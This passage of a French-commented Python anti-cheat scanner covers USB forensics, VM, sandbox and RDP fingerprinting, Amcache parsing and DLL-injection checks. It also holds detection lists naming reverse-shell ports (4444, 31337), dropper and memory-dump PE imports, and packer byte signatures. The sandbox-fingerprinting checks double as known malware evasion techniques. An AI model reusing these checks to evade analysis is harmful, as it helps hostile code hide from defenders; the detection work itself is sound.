                        instance_id = winreg.EnumKey(device_class_key, j)
                        j += 1
                        
                        instance_key = winreg.OpenKey(device_class_key, instance_id)
                        
                        # Extraire le nom descriptif
                        try:
                            friendly_name, _ = winreg.QueryValueEx(instance_key, "FriendlyName")
                        except FileNotFoundError:
                            friendly_name = device_class.replace("Disk&", "").replace("_", " ").strip()
                        
                        # Parser le device_class pour extraire vendeur/produit
                        # Format: Disk&Ven_Samsung&Prod_Portable_SSD_T7&Rev_0
                        vendor = "Inconnu"
                        product = "Inconnu"
                        parts = device_class.split("&")
                        for p in parts:
                            if p.startswith("Ven_"):
                                vendor = p[4:].replace("_", " ")
                            elif p.startswith("Prod_"):
                                product = p[5:].replace("_", " ")
                        
                        # Vérifier si le périphérique est connecté actuellement
                        is_connected = False
                        try:
                            status_val, _ = winreg.QueryValueEx(instance_key, "StatusFlags")
                            # Si la clé existe et a une valeur, vérifier les flags
                        except FileNotFoundError:
                            pass
                        
                        # Méthode alternative : lister les disques physiques actifs
                        # On compare via le friendly_name contre les partitions montées
                        device_desc = f"{vendor} {product}".strip()
                        
                        # Obtenir la date de dernière connexion depuis le registre Properties
                        last_seen = "Inconnue"
                        try:
                            props_path = f"{device_class}\\{instance_id}\\Properties"
                            props_key = winreg.OpenKey(usbstor_key, props_path)
                            winreg.CloseKey(props_key)
                        except (FileNotFoundError, OSError):
                            pass
                        
                        usb_devices.append({
                            "device_class": device_class,
                            "instance_id": instance_id,
                            "friendly_name": friendly_name,
                            "vendor": vendor,
                            "product": product,
                            "description": device_desc,
                            "is_connected": is_connected,
                            "last_seen": last_seen,
                            "status": "CONNECTÉ" if is_connected else "DÉCONNECTÉ"
                        })
                        
                        winreg.CloseKey(instance_key)
                    except OSError:
                        break
                winreg.CloseKey(device_class_key)
            except OSError:
                break
        winreg.CloseKey(usbstor_key)
    except (FileNotFoundError, PermissionError, OSError):
        pass
    
    # Enrichir avec les SetupAPI logs pour la date de dernière connexion
    try:
        setupapi_log = os.path.join(os.environ.get("WINDIR", r"C:\Windows"), "inf", "setupapi.dev.log")
        if os.path.exists(setupapi_log):
            with open(setupapi_log, "r", encoding='utf-8', errors='replace') as f:
                # Lire les dernières 50 000 lignes (fichier peut être très gros)
                lines = f.readlines()[-50000:]
                
            for device in usb_devices:
                instance = device["instance_id"].lower()
                for idx, line in enumerate(lines):
                    if instance in line.lower():
                        # Chercher la ligne de timestamp la plus proche
                        for check_line in lines[max(0, idx-5):idx+5]:
                            if ">>>  Section start" in check_line or ">>>  [" in check_line:
                                # Extraire la date du format ">>>  Section start 2025/07/28 14:32:11.123"
                                parts = check_line.strip().split()
                                for k, part in enumerate(parts):
                                    if "/" in part and len(part) == 10 and part[4] == "/":
                                        device["last_seen"] = part
                                        break
    except Exception:
        pass
    
    if progress_callback:
        connected = sum(1 for d in usb_devices if d["is_connected"])
        disconnected = len(usb_devices) - connected
        progress_callback("Forensique USB/SSD", pct + 1, f"{len(usb_devices)} périphérique(s) ({connected} connecté(s), {disconnected} déconnecté(s))")
    
    return usb_devices

# ─────────────────────────────────────────────
# DÉTECTION VM / SANDBOX — Lance le scanner DANS une VM ?
# ─────────────────────────────────────────────
def scan_vm_and_sandbox(progress_callback=None, pct=80):
    """
    Détecte si le scanner est lancé DEPUIS L'INTÉRIEUR d'une VM, sandbox, ou via RDP/VPS.
    IMPORTANT : On NE flag PAS si VMware est juste installé sur le PC hôte.
    On détecte uniquement si Windows tourne dans un environnement virtuel actif OU RDP/VPS.
    """
    if progress_callback:
        progress_callback("Détection VM/Sandbox/RDP", pct, "Vérification de l'environnement d'exécution...")

    vm_score = 0
    details  = []

    # ── Vecteur 1 : Drivers VM actifs dans System32\drivers ──
    drivers_path = r"C:\Windows\System32\drivers"
    vm_drivers = {
        "vmhgfs.sys"    : "VMware Shared Folders driver",
        "vmci.sys"      : "VMware Communication Interface",
        "vmmouse.sys"   : "VMware Mouse driver",
        "vmrawdsk.sys"  : "VMware Raw Disk driver",
        "vmusbmouse.sys": "VMware USB Mouse driver",
        "vboxdrv.sys"   : "VirtualBox Kernel driver",
        "vboxguest.sys" : "VirtualBox Guest driver",
        "vboxmouse.sys" : "VirtualBox Mouse driver",
        "VBoxWddm.sys"  : "VirtualBox WDDM Display driver",
        "qxldod.sys"    : "QEMU/KVM Display driver",
        "virtio-net.sys": "QEMU VirtIO Network driver",
    }
    for drv, desc in vm_drivers.items():
        if os.path.exists(os.path.join(drivers_path, drv)):
            vm_score += 2
            details.append(f"Driver VM actif : {drv} ({desc})")

    # ── Vecteur 2 : Registry VMware / VirtualBox ──
    vm_reg_keys = [
        (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\VMware, Inc.\VMware Tools"),
        (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Oracle\VirtualBox Guest Additions"),
        (winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Services\VBoxGuest"),
        (winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Services\VMTools"),
        (winreg.HKEY_LOCAL_MACHINE, r"HARDWARE\ACPI\DSDT\VBOX__"),
        (winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Services\vmhgfs"),
    ]
    for hive, reg_path in vm_reg_keys:
        try:
            k = winreg.OpenKey(hive, reg_path)
            winreg.CloseKey(k)
            vm_score += 3
            details.append(f"Clé registry VM : {reg_path.split(chr(92))[-1]}")
        except (FileNotFoundError, OSError, PermissionError):
            pass

    # ── Vecteur 3 : Processus VM actifs ──
    vm_processes = {
        "vmtoolsd"   : "VMware Tools Service",
        "vmwaretray" : "VMware Tray",
        "vmwareuser" : "VMware User Agent",
        "vboxservice": "VirtualBox Guest Service",
        "vboxtray"   : "VirtualBox Tray",
        "qemu-ga"    : "QEMU Guest Agent",
        "xenservice"  : "Xen Guest Service",
        "prl_tools"  : "Parallels Tools",
    }
    if psutil is not None:
        try:
            running = {p.info["name"].lower() for p in psutil.process_iter(["name"]) if p.info["name"]}
            for proc_name, desc in vm_processes.items():
                if proc_name in running:
                    vm_score += 3
                    details.append(f"Processus VM actif : {proc_name}.exe ({desc})")
        except Exception:
            pass

    # ── Vecteur 4 : RAM très faible (sandboxes ont souvent < 2 GB) ──
    if psutil is not None:
        try:
            ram_gb = psutil.virtual_memory().total / (1024 ** 3)
            if ram_gb < 2.5:
                vm_score += 2
                details.append(f"RAM très faible : {ram_gb:.1f} GB (typique sandbox)")
        except Exception:
            pass

    # ── Vecteur 5 : Très peu de CPU cores (sandboxes = 1-2 cores) ──
    cpu_cores = os.cpu_count() or 4
    if cpu_cores <= 2:
        vm_score += 1
        details.append(f"Peu de cœurs CPU : {cpu_cores} (typique sandbox/VM)")

    # ── Vecteur 6 : Username générique de sandbox ──
    try:
        username = getpass.getuser().lower()
        sandbox_users = {"sandbox", "virus", "malware", "test", "analysis",
                         "cuckoo", "maltest", "tester", "sample", "vmuser"}
        if username in sandbox_users or any(kw in username for kw in sandbox_users):
            vm_score += 3
            details.append(f"Username générique de sandbox : '{username}'")
    except Exception:
        pass

    # ── Vecteur 7 : Bureau complètement vide (aucun fichier personnel) ──
    try:
        user_profile = os.environ.get("USERPROFILE", "")
        desktop_path = os.path.join(user_profile, "Desktop")
        docs_path    = os.path.join(user_profile, "Documents")
        desktop_count = len(os.listdir(desktop_path)) if os.path.isdir(desktop_path) else 0
        docs_count    = len([f for f in os.listdir(docs_path) if not f.startswith(".")]) if os.path.isdir(docs_path) else 0
        if desktop_count == 0 and docs_count == 0:
            vm_score += 2
            details.append("Bureau et Documents vides (aucun fichier personnel — environnement propre de sandbox)")
    except Exception:
        pass

    # ══════════════════════════════════════════════════════════════
    #  RDP / VPS / VPS CLOUD DETECTION
    # ══════════════════════════════════════════════════════════════

    # ── Vecteur 8 : Session RDP active ──
    try:
        is_rdp = False
        rdp_session_id = os.environ.get("SESSIONNAME", "").lower()
        if "rdp" in rdp_session_id:
            is_rdp = True
            vm_score += 5
            details.append(f"Session RDP active : SESSIONNAME={os.environ.get('SESSIONNAME', 'N/A')}")

        if not is_rdp:
            result = subprocess.run(
                ["query", "session"],
                capture_output=True, text=True, encoding='utf-8', errors='replace', timeout=5,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            if result.returncode == 0:
                for line in result.stdout.splitlines():
                    lower = line.lower()
                    if "rdp-tcp" in lower and ("active" in lower or "connected" in lower):
                        vm_score += 5
                        details.append(f"Session RDP-TCP détectée : {line.strip()}")
                        is_rdp = True
                        break
    except Exception:
        pass

    # ── Vecteur 9 : Service Terminal / RDP actif ──
    rdp_services = {
        "TermService"       : "Terminal Services (RDP)",
        "SessionEnv"        : "Remote Desktop Configuration",
        "UmRdpService"      : "Remote Desktop Services UserMode",
        "rdpdr"             : "RDP Device Redirector",
        "rdpwsx"            : "RDP Wrapper",
    }
    if psutil is not None:
        try:
            running_svcs = set()
            for svc in psutil.win_services_iter():
                try:
                    if svc.status() == psutil.STATUS_RUNNING:
                        running_svcs.add(svc.name().lower())
                except Exception:
                    pass
            for svc_name, desc in rdp_services.items():
                if svc_name.lower() in running_svcs:
                    vm_score += 1
                    details.append(f"Service RDP actif : {svc_name} ({desc})")
        except Exception:
            pass

    # ── Vecteur 10 : IP publique type VPS/cloud (pas IP locale 192.168.x.x) ──
    try:
        local_ip = None
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
        except Exception:
            pass
        finally:
            s.close()

        if local_ip:
            is_private = (
                local_ip.startswith("10.") or
                local_ip.startswith("172.") and 16 <= int(local_ip.split(".")[1]) <= 31 or
                local_ip.startswith("192.168.") or
                local_ip.startswith("127.") or
                local_ip == "0.0.0.0"
            )
            # Vérifier aussi les plages de cloud providers
            cloud_ranges = [
                ("169.254.", "Link-local (typique cloud/VPS)"),
                ("100.64.", "CGNAT (typique cloud/VPS)"),
                ("172.31.", "AWS VPC / cloud private"),
            ]
            for prefix, desc in cloud_ranges:
                if local_ip.startswith(prefix):
                    vm_score += 3
                    details.append(f"IP type VPS/cloud détectée : {local_ip} ({desc})")
                    break
    except Exception:
        pass

    # ── Vecteur 11 : Hostname générique de VPS/cloud ──
    try:
        hostname = __import__("socket").gethostname().lower()
        vps_hostname_patterns = ["vps", "server", "cloud", "host", "node", "srv",
                                 "dedi", "rdp", "remote", "azure", "aws", "gcp"]
        if any(pat in hostname for pat in vps_hostname_patterns):
            vm_score += 2
            details.append(f"Hostname type VPS/cloud : '{hostname}'")
    except Exception:
        pass

    # ── Vecteur 12 : UID machine typique cloud/VPS ──
    try:
        result = subprocess.run(
            ["wmic", "csproduct", "get", "UUID"],
            capture_output=True, text=True, encoding='utf-8', errors='replace', timeout=5,
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        if result.returncode == 0:
            lines = [l.strip() for l in result.stdout.strip().split("\n") if l.strip() and l.strip().upper() != "UUID"]
            if lines:
                machine_uuid = lines[0].lower()
                vps_uuid_prefixes = [
                    "00000000-0000-0000-0000-",  # Hyper-V / cloud générique
                ]
                if any(machine_uuid.startswith(p) for p in vps_uuid_prefixes):
                    vm_score += 2
                    details.append(f"UUID machine type cloud/VPS : {machine_uuid[:20]}...")
    except Exception:
        pass

    # ── Vecteur 13 : absence de périphériques USB physiques ──
    try:
        result = subprocess.run(
            ["wmic", "path", "Win32_USBController", "get", "DeviceID"],
            capture_output=True, text=True, encoding='utf-8', errors='replace', timeout=5,
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        if result.returncode == 0:
            usb_count = len([l for l in result.stdout.strip().split("\n") if l.strip().startswith("USB")])
            if usb_count == 0:
                vm_score += 1
                details.append("Aucun contrôleur USB physique détecté (typique VPS/cloud)")
    except Exception:
        pass

    # ── Vecteur 14 : Écran résolution faible / résolution VM ──
    try:
        import ctypes
        user32 = ctypes.windll.user32
        screen_w = user32.GetSystemMetrics(0)
        screen_h = user32.GetSystemMetrics(1)
        if screen_w <= 1024 and screen_h <= 768:
            vm_score += 1
            details.append(f"Résolution écran faible : {screen_w}x{screen_h} (typique VM/RDP)")
    except Exception:
        pass

    # ── Vecteur 15 : MAC address vendor (OUI) VPS/cloud ──
    try:
        if psutil is not None:
            addrs = psutil.net_if_addrs()
            vps_mac_prefixes = {
                "00:0c:29": "VMware",
                "00:50:56": "VMware",
                "08:00:27": "VirtualBox",
                "52:54:00": "QEMU/KVM",
                "00:16:3e": "Xen",
                "00:15:5d": "Hyper-V",
                "00:1c:42": "Parallels",
            }
            for iface, addr_list in addrs.items():
                for addr in addr_list:
                    if addr.family == psutil.AF_LINK and addr.address:
                        mac = addr.address.lower().replace("-", ":")
                        mac_prefix = mac[:8]
                        if mac_prefix in vps_mac_prefixes:
                            vm_score += 2
                            details.append(f"MAC address VM détectée ({vps_mac_prefixes[mac_prefix]}) : {addr.address}")
    except Exception:
        pass

    # ── Verdict ──
    is_running_in_vm = vm_score >= 4
    is_rdp_vps = vm_score >= 6 and vm_score < 10

    if progress_callback:
        if vm_score >= 10:
            verdict_text = "RDP/VPS cloud détecté !"
        elif is_running_in_vm:
            verdict_text = "VM/Sandbox détectée !"
        else:
            verdict_text = "Environnement physique confirmé"
        progress_callback("Détection VM/Sandbox/RDP", pct + 1, f"Score VM/RDP : {vm_score} — {verdict_text}")

    return {
        "is_running_in_vm": is_running_in_vm,
        "vm_score"        : vm_score,
        "details"         : details,
        "verdict"         : "SCAN_INVALIDE_VM" if is_running_in_vm else "CLEAN"
    }


# ─────────────────────────────────────────────
# FORENSIQUE : AMCACHE.HVE — HISTORIQUE COMPLET EXÉCUTABLES
# ─────────────────────────────────────────────
def scan_amcache(progress_callback=None, pct=81):
    """
    Analyse Amcache.hve — la source forensique la plus puissante de Windows.
    Enregistre SHA1 + chemin de TOUS les exécutables jamais lancés, même supprimés.
    Détecté dans echo-free.exe (Echo Anti-Cheat) via reverse engineering.
    """
    if progress_callback:
        progress_callback("Forensique Amcache", pct, "Lecture de Amcache.hve (historique complet des exécutables)...")

    traces = []
    amcache_path = r"C:\Windows\AppCompat\Programs\Amcache.hve"

    if not os.path.exists(amcache_path):
        return traces

    # ── On copie le fichier dans Temp car il est verrouillé par Windows ──
    import tempfile, shutil
    tmp_hive = os.path.join(tempfile.gettempdir(), "_anti_amcache_tmp.hve")
    hive_key  = r"HKLM\ANTITMP_AMCACHE"
    try:
        # Supprimer toute copie résiduelle
        if os.path.exists(tmp_hive):
            try: os.remove(tmp_hive)
            except: pass

        # Copier via robocopy (contourne le verrou SYSTEM)
        res = subprocess.run(
            ["robocopy",
             os.path.dirname(amcache_path),
             os.path.dirname(tmp_hive),
             os.path.basename(amcache_path),
             "/NJH", "/NJS", "/NFL", "/NDL"],
            capture_output=True, timeout=8,
            creationflags=subprocess.CREATE_NO_WINDOW
        )

        # Renommer vers le nom tmp
        src = os.path.join(os.path.dirname(tmp_hive), "Amcache.hve")
        if os.path.exists(src) and src != tmp_hive:
            shutil.move(src, tmp_hive)

        if not os.path.exists(tmp_hive):
            return traces

        # ── Charger la ruche dans le registre ──
        subprocess.run(
            ["reg", "load", hive_key, tmp_hive],
            capture_output=True, timeout=5,
            creationflags=subprocess.CREATE_NO_WINDOW
        )

        # ── Lire InventoryApplicationFile (Windows 10+) ──
        inv_path = r"ANTITMP_AMCACHE\Root\InventoryApplicationFile"
        try:
            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, inv_path)
            i = 0
            while True:
                try:
                    subkey_name = winreg.EnumKey(key, i)
                    i += 1
                    try:
                        subkey = winreg.OpenKey(key, subkey_name)
                        # Lire les valeurs clés
                        try: file_path, _ = winreg.QueryValueEx(subkey, "LowerCaseLongPath")
                        except: file_path = ""
                        try: name, _      = winreg.QueryValueEx(subkey, "Name")
                        except: name = subkey_name
                        try: file_id, _   = winreg.QueryValueEx(subkey, "FileId")
                        except: file_id = ""

                        # SHA1 est stocké dans FileId sous forme "0000" + sha1
                        sha1 = file_id[4:] if file_id and len(file_id) > 4 else ""

                        name_lower = name.lower()
                        path_lower = file_path.lower()

                        # Ignorer nos propres outils et frameworks légitimes
                        if any(legit in name_lower or legit in path_lower for legit in LEGITIMATE_FRAMEWORKS):
                            winreg.CloseKey(subkey)
                            continue

                        # Ignorer les binaires système et signés légitimes dans Amcache
                        system_prefixes = (
                            "c:\\windows\\system32\\",
                            "c:\\windows\\syswow64\\",
                            "c:\\windows\\winsxs\\",
                            "c:\\windows\\diagnostics\\",
                            "c:\\windows\\servicing\\",
                        )
                        if any(path_lower.startswith(p) for p in system_prefixes):
                            winreg.CloseKey(subkey)
                            continue

                        if is_trusted_system_or_signed(file_path):
                            winreg.CloseKey(subkey)
                            continue

                        # Vérifier si c'est un cheat
                        match = _is_fivem_cheat_file(name, file_path)
                        if match:
                            traces.append({
                                "executable_name": name,
                                "exe_path"        : file_path,
                                "sha1"            : sha1,
                                "severity"        : match.get("severity", "CRITICAL"),
                                "description"     : f"Trace Amcache.hve : '{name}' — {match['reason']} (SHA1: {sha1[:16]}...)"
                            })
                        winreg.CloseKey(subkey)
                    except Exception:
                        pass
                except OSError:
                    break
            winreg.CloseKey(key)
        except Exception:
            pass

    except Exception:
        pass
    finally:
        # ── Décharger et nettoyer ──
        try:
            subprocess.run(
                ["reg", "unload", hive_key],
                capture_output=True, timeout=5,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
        except: pass
        try:
            if os.path.exists(tmp_hive):
                os.remove(tmp_hive)
        except: pass

    if progress_callback:
        progress_callback("Forensique Amcache", pct + 1, f"{len(traces)} trace(s) Amcache détectée(s)")

    return traces


# ─────────────────────────────────────────────
# FORENSIQUE : SCAN DES CONNEXIONS RÉSEAU ACTIVES (Option 2)
# ─────────────────────────────────────────────
def scan_network_connections(progress_callback=None, pct=82):
    """
    Analyse les connexions réseau actives à la recherche de ports hack/cheat connus.
    """
    if progress_callback:
        progress_callback("Réseau", pct, "Vérification des connexions réseau actives...")

    traces = []
    suspicious_ports = {1337, 31337, 4444, 6666}

    if psutil is not None:
        try:
            for conn in psutil.net_connections(kind='inet'):
                if conn.status == 'LISTEN' or conn.status == 'ESTABLISHED':
                    lport = conn.laddr.port if conn.laddr else None
                    rport = conn.raddr.port if conn.raddr else None
                    
                    if lport in suspicious_ports or rport in suspicious_ports:
                        port = lport if lport in suspicious_ports else rport
                        pid = conn.pid
                        proc_name = "Inconnu"
                        if pid:
                            try:
                                proc_name = psutil.Process(pid).name()
                            except: pass

                        traces.append({
                            "port": port,
                            "pid": pid,
                            "process_name": proc_name,
                            "status": conn.status,
                            "severity": "HIGH",
                            "description": f"Connexion suspecte détectée sur le port {port} (Statut: {conn.status}, Processus: {proc_name} [{pid}])"
                        })
        except Exception:
            pass

    return traces


# ─────────────────────────────────────────────
# INJECTION : DÉTECTION DES DLL INJECTÉES DANS LES PROCESSUS JEU (Option 1)
# ─────────────────────────────────────────────
def scan_advanced_dll_injection(progress_callback=None, pct=83):
    """
    Détecte les injections de DLL suspectes dans les processus de jeu cibles.
    Amélioré : scan TOUTES les DLL hors répertoire du jeu, y compris AppData, ProgramData, etc.
    """
    if progress_callback:
        progress_callback("Injection DLL", pct, "Analyse des DLLs chargées dans les processus de jeu...")

    traces = []
    game_processes = {"fivem", "gta5", "rdr2", "ffxiv"}

    FIVEDM_DIR_NAMES = {"fivem.app", "fivem", "citizen"}

    # ── Chemins LÉGITIMES (pas flaggués) ──
    LEGIT_DLL_PATHS = {
        "c:\\windows\\system32", "c:\\windows\\syswow64", "c:\\windows\\winsxs",
        "c:\\program files\\nvidia corporation", "c:\\program files (x86)\\nvidia corporation",
        "c:\\program files\\amd", "c:\\program files (x86)\\amd",
        "c:\\program files\\microsoft", "c:\\program files (x86)\\microsoft",
        "c:\\windows\\explorer.exe", "c:\\windows\\systemapps",
        "c:\\program files\\windowsapps",
    }

    # ── DLLs Windows légitimes (jamais flagguées) ──
    LEGIT_WINDOWS_DLLS = {
        "kernel32.dll", "ntdll.dll", "user32.dll", "gdi32.dll", "advapi32.dll",
        "ws2_32.dll", "ole32.dll", "oleaut32.dll", "shell32.dll", "shlwapi.dll",
        "winhttp.dll", "wininet.dll", "crypt32.dll", "rpcrt4.dll", "secur32.dll",
        "version.dll", "dbghelp.dll", "dbgcore.dll", "d3d11.dll", "d3d9.dll",
        "dxgi.dll", "opengl32.dll", "glu32.dll", "msvcrt.dll", "msvcp140.dll",
        "vcruntime140.dll", "ucrtbase.dll", "wintab32.dll", "inputhost.dll",
        "coremessaging.dll", "coreuicomponents.dll", "windows.ui.xaml.dll",
        "dwmapi.dll", "uxtheme.dll", "d3d11on12.dll", "d2d1.dll",
        "textinputframework.dll", "fontext.dll", "mlang.dll",
    }

    if psutil is not None:
        try:
            for p in psutil.process_iter(['pid', 'name']):
                pname = p.info['name']
                if pname and any(g in pname.lower() for g in game_processes):
                    pid = p.info['pid']
                    try:
                        proc = psutil.Process(pid)
                        try:
                            proc_exe = proc.exe()
                            proc_dir = os.path.dirname(proc_exe).lower()
                        except Exception:
                            proc_dir = ""
                        for m in proc.memory_maps():
                            path = m.path
                            if path and path.endswith('.dll'):
                                path_lower = path.lower()
                                filename = os.path.basename(path)

                                # Ignorer DLLs Windows légitimes
                                if filename.lower() in LEGIT_WINDOWS_DLLS:
                                    continue

                                # Ignorer DLLs dans le répertoire du jeu
                                if proc_dir and path_lower.startswith(proc_dir):
                                    continue

                                # Ignorer DLLs dans les sous-dossiers FiveM légitimes
                                is_fivem_sub = any(fd in path_lower for fd in FIVEDM_DIR_NAMES)
                                if is_fivem_sub and ("\\bin\\" in path_lower or "\\citizen\\" in path_lower or "\\clr2\\" in path_lower):
                                    continue

                                # Ignorer DLLs dans les chemins légitimes connus
                                if any(path_lower.startswith(lp) for lp in LEGIT_DLL_PATHS):
                                    continue

                                # ── NOUVEAU : Vérifier la signature pour TOUTE DLL hors zone légitime ──
                                is_unsigned = False
                                is_suspicious_name = False
                                is_in_appdata = "\\appdata\\" in path_lower
                                is_in_programdata = "\\programdata\\" in path_lower
                                is_in_users = "\\users\\" in path_lower and "\\appdata\\" not in path_lower

                                # Nom de DLL suspect (commun pour les cheats)
                                suspicious_dll_names = {
                                    "dinput8.dll", "dinput.dll", "dsound.dll",
                                    "winhttp.dll", "version.dll", "dbghelp.dll",
                                }
                                if filename.lower() in suspicious_dll_names and is_fivem_sub:
                                    is_suspicious_name = True

                                try:
                                    if any(own in filename.lower() for own in LEGITIMATE_FRAMEWORKS):
                                        continue

                                    from src.authenticode import check_authenticode_signature
                                    sig = check_authenticode_signature(path)
                                    if not sig.get("signed", False):
                                        is_unsigned = True
                                except:
                                    is_unsigned = True

                                # Flag si : non signée ET dans un chemin suspect (AppData, ProgramData, Downloads, Temp)
                                should_flag = is_unsigned and (is_in_appdata or is_in_programdata or is_in_users or is_suspicious_name)

                                if should_flag:
                                    traces.append({
                                        "process_name": pname,
                                        "pid": pid,
                                        "dll_name": filename,
                                        "dll_path": path,
                                        "severity": "CRITICAL" if is_in_appdata else "HIGH",
                                        "description": f"DLL non signée injectée dans {pname} (PID: {pid}) : {filename} ({path})"
                                    })
                    except Exception:
                        pass
        except Exception:
            pass

    return traces


# ─────────────────────────────────────────────
# INFOS SYSTÈME
# ─────────────────────────────────────────────
def get_os_installation_date():
    try:
        ps_cmd = "(Get-CimInstance Win32_OperatingSystem).InstallDate.ToString('yyyy-MM-dd HH:mm:ss')"
        res = subprocess.run(
            ["powershell", "-NoProfile", "-NonInteractive", "-Command", ps_cmd],
            capture_output=True, text=True, encoding='utf-8', errors='replace', timeout=3
        ,
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        date_str = res.stdout.strip()
        if date_str and "error" not in date_str.lower():
            install_dt = datetime.strptime(date_str, "%Y-%m-%d %H:%M:%S")
            age_hours = round((datetime.now() - install_dt).total_seconds() / 3600, 1)
            is_recent_reformat = age_hours < 48.0
            
            return {
                "install_date": date_str,
                "age_hours"   : age_hours,
                "is_recent_reformat": is_recent_reformat,
                "status_text": f"Formatage Récent ({age_hours}h)" if is_recent_reformat else f"Normal ({round(age_hours/24, 1)} jours)"
            }
    except Exception:
        pass

    return {
        "install_date": "Inconnue",
        "age_hours"   : 9999,
        "is_recent_reformat": False,
        "status_text": "Non déterminé"
    }

# ─────────────────────────────────────────────
# FORENSIQUE PE AVANCÉ — Découvert via analyse dynamique VM (rapports 2026-08-03)
# ─────────────────────────────────────────────

# Imports PE dangereux connus (combinaisons = indicateurs de cheats)
_PE_DANGER_IMPORTS = {
    b"SetupDiGetDeviceRegistryPropertyW": ("HWID Spoofer (énumération hardware)",    55),
    b"SHDeleteKeyA":                      ("Anti-Forensique (suppression registre)",  40),
    b"URLDownloadToFileA":               ("Dropper réseau (téléchargement payload)", 70),
    b"MiniDumpWriteDump":                ("Dump mémoire (vol de données processus)", 65),
    b"FwpmSubLayerAdd0":                 ("WFP - Filtre réseau Windows",             50),
    b"if_nametoindex":                   ("Spoof adresse MAC",                       40),
    b"QueryServiceConfigW":              ("Scan des services AV/anti-cheat",         35),
    b"UnloadUserProfile":               ("Nettoyage profil anti-forensique",         25),
    b"BitBlt":                           ("Capture d'écran silencieuse",             20),
    b"D3DCompiler_43":                   ("DirectX legacy (cheat overlay hérité)",   45),
    b"d3dx11_43":                        ("DirectX legacy (cheat overlay hérité)",   45),
    b"D3D11CreateDeviceAndSwapChain":    ("Overlay DirectX 11 (ESP/Wallhack)",       25),
    b"CryptProtectData":                ("DPAPI (chiffrement config/licence)",       20),
    b"NtSetInformationThread":           ("Anti-debug (masquage thread)",            35),
    b"CryptCATAdminEnumCatalogFromHash": ("Évasion AV (vérif. catalogue)",          30),
}

# Stub packer commun SPOOFER + CHEAT1 (bitstream/RLE custom) — 23 octets EP identiques
_PACKER_STUB_HEX = bytes.fromhex("e8820100004152498966e2415249")
_PACKER_STUB_LONG = bytes.fromhex(
    "e88201000041524989e24152498b7210498b7a20fcb2808a0648ffc6880748ffc7"
)


def _check_pe_imports_danger(file_path: str) -> dict | None:
    """
    Lit les 10 premiers Mo d'un exe et cherche les imports PE dangereux.
    Version contextuelle : réduit le score pour les apps légitimes connues.
    """
    try:
        if not os.path.isfile(file_path):
            return None
        if is_trusted_system_or_signed(file_path):
            return None
        fsize = os.path.getsize(file_path)
        if fsize < 512:
            return None

        with open(file_path, "rb") as f:
            data = f.read(min(fsize, 10_000_000))

        hits = []
        total_score = 0

        has_setupdi   = b"SetupDiGetDeviceRegistryPropertyW" in data
        has_shdelete  = b"SHDeleteKeyA" in data
        has_urldl     = b"URLDownloadToFileA" in data
        has_minidump  = b"MiniDumpWriteDump" in data
        has_d3d_legacy = b"D3DCompiler_43" in data or b"d3dx11_43" in data
        has_d3d11     = b"D3D11CreateDeviceAndSwapChain" in data or b"d3d11.dll" in data.lower()

        for api_bytes, (desc, score) in _PE_DANGER_IMPORTS.items():
            if api_bytes in data:
                hits.append(f"{api_bytes.decode('ascii', errors='ignore')} → {desc}")
                total_score += score

        file_lower = file_path.lower()
        is_in_temp = any(kw in file_lower for kw in ["\\temp\\", "\\downloads\\", "\\appdata\\local\\temp", "\\users\\public\\"])
        is_known_app = any(p in file_lower for p in [
            "fivem", "gta5", "rdr2", "chrome", "firefox", "edge", "discord",
            "steam", "epic games", "rockstar", "battle.net", "blizzard",
            "ea sports", "ea games", "games", "steamlibrary", "ubisoft", "gog",
            "medal", "obs", "xampp", "visual studio", "vs code",
            "program files", "windowsapps", "wise memory", "iobit", "driver booster",
            "nvidia", "amd", "intel", "realtek",
            "microsoft", "windows defender", "msmpeng",
            "epicinstaller", "epic online",
            "brave", "bravebrowser",
            "bluestacks", "onedrive",
            "riot games", "valorant", "vanguard",
            "translucenttb", "widgetboard",
            "malwarebytes", "anti-malware", "mbam",
            "ollama", "python", "node", "git",
            "oracle", "virtualbox", "vmware",
            "windows\\system32", "windows\\syswow64",
        ])
        context_penalty = 0
        if is_known_app and not is_in_temp:
            context_penalty = -60

        if has_setupdi and has_shdelete:
            total_score += 40
            hits.insert(0, "[COMBO CRITIQUE] SetupDi+SHDeleteKeyA = HWID Spoofer confirmé")
        if has_urldl and (has_d3d11 or has_d3d_legacy):
            total_score += 35
            hits.insert(0, "[COMBO CRITIQUE] URLDownloadToFileA+D3D = Dropper Cheat confirmé")
        if has_minidump and has_d3d11:
            combo_score = 30 + context_penalty
            if combo_score > 0:
                total_score += combo_score
                hits.insert(0, "[COMBO CRITIQUE] MiniDumpWriteDump+D3D = Dump+Overlay confirmé")
            else:
                total_score += 5
                hits.insert(0, "[INFO] MiniDumpWriteDump+D3D dans app légitime (crash dump + rendu)")
        if has_d3d_legacy:
            hits.insert(0, "[SIGNATURE] D3DCompiler_43/d3dx11_43 = DirectX legacy (cheat overlay)")

        total_score = max(0, total_score + context_penalty)

        if total_score >= 80 and hits:
            severity = "CRITICAL" if total_score >= 80 else "HIGH"
            return {
                "is_cheat": True,
                "severity": severity,
                "reason": (
                    f"Imports PE dangereux détectés dans '{os.path.basename(file_path)}' "
                    f"(score={total_score}) : {' | '.join(hits[:5])}"
                )
            }
    except Exception:
        pass
    return None


def _check_pe_packer_stub(file_path: str) -> dict | None:
    """
    Détecte le stub packer commun SPOOFER + CHEAT1 (bitstream/RLE custom).
    Les 33 octets au point d'entrée sont identiques dans les 2 familles.
    Découvert via analyse statique + VM (2026-08-03).
    """
    try:
        if not os.path.isfile(file_path):
            return None
        if is_trusted_system_or_signed(file_path):
            return None
        fsize = os.path.getsize(file_path)
        if fsize < 4096:
            return None

        with open(file_path, "rb") as f:
            header = f.read(4096)

        if not header.startswith(b'MZ'):
            return None

        # Lire l'adresse RVA du point d'entrée depuis l'Optional Header
        pe_off = int.from_bytes(header[0x3C:0x40], 'little')
